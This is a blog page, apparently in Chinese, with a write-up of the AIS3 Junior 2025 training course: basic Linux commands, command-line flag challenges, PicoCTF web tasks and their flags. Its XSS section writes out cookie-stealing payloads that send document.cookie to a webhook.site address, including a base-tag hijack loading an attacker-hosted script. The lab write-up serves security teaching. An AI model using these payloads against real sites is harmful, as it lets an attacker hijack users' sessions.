@@ -1,0 +1,900 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="zergling_73">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/08/15/ais3 junior 2025 前端課程/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 Junior 2025 前端課程">
+<meta property="og:url" content="http://example.com/2025/08/15/AIS3%20Junior%202025%20%E5%89%8D%E7%AB%AF%E8%AA%B2%E7%A8%8B/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-08-15T15:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-12T01:10:08.810Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="AIS3 Junior">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            AIS3 Junior 2025 前端課程 | Zergling73&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Zergling73&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">AIS3 Junior 2025 前端課程</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">zergling_73</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-15 23:00</span>
+        <span class="mobile">2025-08-15 23:00</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-09-12 09:10:08</span>
+            <span class="mobile">2025-09-12 09:10:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Write-up/">Write-up</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/AIS3-Junior/">AIS3 Junior</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>AIS3 Junior 2025 Linux指令與前端Lab課程 筆記 &amp; Write-Up</p>
+<span id="more"></span>
+
+<h1 id="AIS3-Junior-2025-Linux指令與前端Lab課程"><a href="#AIS3-Junior-2025-Linux指令與前端Lab課程" class="headerlink" title="AIS3 Junior 2025 Linux指令與前端Lab課程"></a>AIS3 Junior 2025 Linux指令與前端Lab課程</h1><h2 id="一、Linux-Command"><a href="#一、Linux-Command" class="headerlink" title="一、Linux Command"></a>一、Linux Command</h2><h3 id="資料管理："><a href="#資料管理：" class="headerlink" title="資料管理："></a>資料管理：</h3><ul>
+<li><code>ls</code> 列出當前目錄下的內容</li>
+<li><code>cd</code> 切換當前目錄</li>
+<li><code>pwd</code> 列出當前位置</li>
+<li><code>cp</code> 複製檔案或目錄</li>
+<li><code>mv</code> 移動&#x2F;重新命名檔案</li>
+<li><code>rm</code> 刪除檔案或目錄</li>
+<li><code>mkdir/rmdir</code> 創建&#x2F;刪除資料夾</li>
+<li><code>touch</code> 建立一個檔案</li>
+<li><code>find</code>尋找檔案</li>
+<li><code>stat</code> 顯示檔案詳細資訊</li>
+</ul>
+<h3 id="檔案處理："><a href="#檔案處理：" class="headerlink" title="檔案處理："></a>檔案處理：</h3><ul>
+<li><code>cat</code> 印出內容</li>
+<li><code>nano/vim</code> 編輯內容</li>
+<li><code>grep</code> 搜尋文字</li>
+<li><code>strings</code> 搜尋字串</li>
+<li><code>chmod/chown</code> 變更檔案權限&#x2F;擁有者</li>
+</ul>
+<h3 id="系統管理："><a href="#系統管理：" class="headerlink" title="系統管理："></a>系統管理：</h3><ul>
+<li><code>whoami</code> 顯示當前使用者</li>
+<li><code>sudo</code> 以管理員身份執行</li>
+<li><code>passwd</code> 更改密碼</li>
+<li><code>kill</code> 終止程式</li>
+</ul>
+<h3 id="遠端與網路："><a href="#遠端與網路：" class="headerlink" title="遠端與網路："></a>遠端與網路：</h3><ul>
+<li><code>ssh</code> 遠端登入至伺服器</li>
+<li><code>curl</code> 用來傳輸資料&#x2F;發起請求(http&#x2F;https)</li>
+<li><code>ping</code> 測試伺服器連線情況</li>
+</ul>
+<h2 id="二、Command-Pratice"><a href="#二、Command-Pratice" class="headerlink" title="二、Command Pratice"></a>二、Command Pratice</h2><h3 id="第一題"><a href="#第一題" class="headerlink" title="第一題"></a>第一題</h3><p>在講師提供的終端機環境中 <code>cd</code>進入<code>challenge1</code><br><code>ls</code>列出檔案列表 發現有名為<code>flag</code>的檔案<br><code>cat flag</code>便可列出檔案內容得到Flag<br><code>AIS3&#123;C0N9_Y0UR_F1R57_F1A9_😼&#125;</code></p>
+<h3 id="第二題"><a href="#第二題" class="headerlink" title="第二題"></a>第二題</h3><p><code>cd</code>進入<code>challenge2</code><br><code>ls</code>列出檔案列表 並未出現任何檔案<br>使用<code>ls -a</code>列出所有檔案和隱藏檔案 發現有<code>.flag</code>的檔案<br><code>cat</code>後得到Flag<br><code>AIS3&#123;15_a1_W0N7_M155_D07_🚩&#125;</code></p>
+<h3 id="第三題"><a href="#第三題" class="headerlink" title="第三題"></a>第三題</h3><p><code>cd</code>進入<code>challenge3</code><br><code>ls</code>列出檔案列表 發現<code>flag</code> 但權限不夠<br>使用<code>chmod 644 flag</code>更改檔案權限<br><code>cat flag</code>顯示出一個要求 要我們在<code>/tmp</code>下建立一個名為<code>meow</code>的檔案<br>使用<code>touch</code>建立後就立刻獲得Flag<br><code>AIS3&#123;M30W_M30W_900D_J0B5&#125;</code></p>
+<h3 id="第四題"><a href="#第四題" class="headerlink" title="第四題"></a>第四題</h3><p><code>cd</code>進入<code>challenge４</code><br><code>ls</code>發現<code>flag</code>和<code>grep</code>在<code>challende4</code>目錄下<br><code>cat flag</code>後得到<br>移動<code>grep</code>到<code>challenge5</code>目錄下的指令<br>使用<code>mv</code>移動後即獲得Flag<br><code>AIS3&#123;M0V3_M0VE_HURRY_UP!&#125;</code></p>
+<h3 id="第五題"><a href="#第五題" class="headerlink" title="第五題"></a>第五題</h3><p><code>cd</code>進入<code>challenge5</code><br>使用剛剛移動至此的<code>grep</code><br>輸入<code>./grep -r &quot;AIS3&quot; .</code><br>和<code>./grep -r &quot;&#125;&quot; .</code><br>就可以找到兩段Flag<br><code>AIS3&#123;M4st3r_0f_S34rch_1$_p0w3rfu11&#125;</code></p>
+<h3 id="第六題"><a href="#第六題" class="headerlink" title="第六題"></a>第六題</h3><p>利用上述方法找到Flag後<br>依提示<code>rm flag</code><br>便可得到Flag<br><code>AIS3&#123;RM_RF_CHUMMY_/_D0N7_D0_17_PL5&#125;</code></p>
+<h2 id="三、PicoCTF-Pratice"><a href="#三、PicoCTF-Pratice" class="headerlink" title="三、PicoCTF Pratice"></a>三、PicoCTF Pratice</h2><h3 id="GET-aHEAD"><a href="#GET-aHEAD" class="headerlink" title="GET aHEAD"></a>GET aHEAD</h3><p>根據題目名稱猜測要使用HEAD method來取得Flag<br>使用burpsuite工具 用HEAD重送封包後<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B1je7Wk5ll.png"
+                      alt="截圖 2025-08-29 下午6.37.32"
+                ><br>便得到Flag</p>
+<h3 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h3><p>一開始會得到此畫面 此時的cookies value &#x3D; -1<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SklAX-y5le.png"
+                      alt="截圖 2025-08-29 下午6.41.06"
+                ><br>將<code>snickerdoodle</code>輸入後搜尋 發現網頁的<code>cookies value</code>從-1變成0<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/BJRU4-y9el.png"
+                      alt="截圖 2025-08-29 下午6.43.28"
+                ><br>猜測解法應與<code>cookies value</code>大小有關<br>再重複測試增加<code>cookies value</code>後<br>在<code>cookies value</code>&#x3D;18時<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJhR4W19eg.png"
+                      alt="截圖 2025-08-29 下午6.45.37"
+                ><br>得到了Flag</p>
+<h3 id="Inspect-HTML"><a href="#Inspect-HTML" class="headerlink" title="Inspect HTML"></a>Inspect HTML</h3><p>題目名稱叫我們檢查HTML檔<br>經過檢查發現Flag就在HTML中<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B10hHW19el.png"
+                      alt="截圖 2025-08-29 下午6.49.22"
+                ></p>
+<h3 id="Bookmarklet"><a href="#Bookmarklet" class="headerlink" title="Bookmarklet"></a>Bookmarklet</h3><p>網頁提供了一段js code<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJaeUbJcgl.png"
+                      alt="截圖 2025-08-29 下午6.50.04"
+                ><br>複製下來後在網頁console中運行 便可得到Flag<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SkeuV8Z1ceg.png"
+                      alt="截圖 2025-08-29 下午6.51.22"
+                ></p>
+<h3 id="WebDecode"><a href="#WebDecode" class="headerlink" title="WebDecode"></a>WebDecode</h3><p>經過翻找後 在about頁面的html中找到一串亂碼<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJT6I-yqlg.png"
+                      alt="截圖 2025-08-29 下午6.53.53"
+                ><br>丟入base64 decode後即獲得Flag<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/r1txvWJ5ge.png"
+                      alt="截圖 2025-08-29 下午6.54.37"
+                ></p>
+<h2 id="四、XSS-Pratice"><a href="#四、XSS-Pratice" class="headerlink" title="四、XSS Pratice"></a>四、XSS Pratice</h2><h3 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h3><p>在輸入匡輸入任意內容後<br>發現網頁HTML中會把輸入內容變成<code>&lt;p&gt;輸入內容&lt;/p&gt;</code><br>接下來測試看看<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br>可以成功跳出訊息<br>接下來使用webhook去獲取使用者的cookie<br><code>fetch(&#39;https://webhook.site/xxxxxxxxxxx&#39;+document.cookie)</code><br>回傳給admin後便可以得到一串亂碼 丟入base64 decode即可獲得Flag<br><code>NCKUCTF&#123;w3lc0m3_70_x55_w0rld&#125;</code></p>
+<h3 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h3><p>將輸入改成<br><code>&lt;img src = x onerror = fetch(&#39;https://webhook.site/xxxxxxxx&#39;+document.cookie)&gt;</code><br>便可依照上述方法獲得Flag<br><code>NCKUCTF&#123;p53ud0_pr070c4l_15_50m3_71m3_3v4l&#125;</code></p>
+<h3 id="XSS3"><a href="#XSS3" class="headerlink" title="XSS3"></a>XSS3</h3><p>觀察發現 輸入的連結會變成超連結的連結網址<br>利用<code>javascript:</code>偽協議將webhook連結放入程式碼中<br><code>fetch(&#39;https://webhook.site/xxxxxxxxxxx&#39;+document.cookie)</code><br>便可依照XSS1、XSS2的解法獲取Flag<br><code>NCKUCTF&#123;1nn3rh7ml_15_n07_3x3cu73_5cr1p7&#125;</code></p>
+<h3 id="XSS4"><a href="#XSS4" class="headerlink" title="XSS4"></a>XSS4</h3><p>因為網頁有<code>一次性隨機數(nonce)</code>的存在<br>無法直接XSS<br>但可以注意到<code>note.html</code>下 有一個<code>&lt;base&gt;</code>元素<br>我在Github Pages儲存庫中新增一個&#x2F;static&#x2F;script.js的檔案<br>並在js檔中放入<br><code>fetch(&#39;https://webhook.site/xxxxxx&#39;+document.cookie)</code><br>回到網頁 在輸入欄中輸入<code>&lt;base href=https://zergling73.com/&gt;</code><br>讓網頁連接回Github Pages儲存庫執行<code>script.js</code><br>再依照前幾題的方法 即可獲得Flag<br><code>NCKUCTF&#123;b453-url_w1ll_n07_f4llb4ck_70_d3f4ul7-5rc&#125;</code></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> AIS3 Junior 2025 前端課程</li>
+        <li><strong>Author:</strong> zergling_73</li>
+        <li><strong>Created at
+                :</strong> 2025-08-15 23:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-09-12 09:10:08
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://zergling73.com/Blog/2025/08/15/AIS3 Junior 2025 前端課程/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/AIS3-Junior/">#AIS3 Junior</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">AIS3 Junior 2025 前端課程</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AIS3-Junior-2025-Linux%E6%8C%87%E4%BB%A4%E8%88%87%E5%89%8D%E7%AB%AFLab%E8%AA%B2%E7%A8%8B"><span class="nav-text">AIS3 Junior 2025 Linux指令與前端Lab課程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Linux-Command"><span class="nav-text">一、Linux Command</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B3%87%E6%96%99%E7%AE%A1%E7%90%86%EF%BC%9A"><span class="nav-text">資料管理：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AA%94%E6%A1%88%E8%99%95%E7%90%86%EF%BC%9A"><span class="nav-text">檔案處理：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%B5%B1%E7%AE%A1%E7%90%86%EF%BC%9A"><span class="nav-text">系統管理：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%81%A0%E7%AB%AF%E8%88%87%E7%B6%B2%E8%B7%AF%EF%BC%9A"><span class="nav-text">遠端與網路：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Command-Pratice"><span class="nav-text">二、Command Pratice</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A1%8C"><span class="nav-text">第一題</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A1%8C"><span class="nav-text">第二題</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A1%8C"><span class="nav-text">第三題</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A1%8C"><span class="nav-text">第四題</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E9%A1%8C"><span class="nav-text">第五題</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E9%A1%8C"><span class="nav-text">第六題</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81PicoCTF-Pratice"><span class="nav-text">三、PicoCTF Pratice</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET-aHEAD"><span class="nav-text">GET aHEAD</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookies"><span class="nav-text">Cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Inspect-HTML"><span class="nav-text">Inspect HTML</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bookmarklet"><span class="nav-text">Bookmarklet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WebDecode"><span class="nav-text">WebDecode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81XSS-Pratice"><span class="nav-text">四、XSS Pratice</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS1"><span class="nav-text">XSS1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 